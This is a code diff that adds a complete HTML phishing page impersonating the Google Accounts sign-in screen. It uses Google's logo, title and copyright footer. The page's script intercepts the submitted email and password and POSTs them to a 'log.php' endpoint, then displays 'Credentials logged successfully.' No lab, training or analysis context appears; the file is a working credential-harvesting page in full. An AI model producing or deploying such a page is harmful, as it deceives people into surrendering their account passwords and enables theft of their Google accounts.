@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in – Google Accounts</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      width: 360px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 75px;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .btn {
+      background: #1a73e8;
+      color: white;
+      padding: 10px;
+      margin-top: 20px;
+      width: 100%;
+      border: none;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #1669c1;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+    }
+
+    .log-output {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </div>
+    <h2>Sign in</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email or phone" required />
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button class="btn" type="submit">Next</button>
+    </form>
+    <div class="log-output" id="log-output"></div>
+    <div class="footer">&copy; 2025 Google · Privacy · Terms</div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      fetch('log.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById('log-output').innerText = 'Credentials logged successfully.';
+      })
+      .catch(error => {
+        document.getElementById('log-output').innerText = 'Error logging credentials.';
+      });
+    });
+  </script>
+</body>
+</html>
